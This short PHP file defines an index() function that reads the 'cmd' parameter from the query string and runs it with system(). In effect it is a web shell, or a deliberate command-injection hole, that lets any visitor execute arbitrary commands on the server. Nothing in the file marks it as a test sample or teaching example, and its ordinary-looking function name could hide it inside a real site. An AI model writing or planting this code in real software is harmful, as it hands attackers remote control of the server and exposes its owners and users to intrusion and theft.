<?php
function index() {
    $cmd = $_GET["cmd"];
    system($cmd);
}
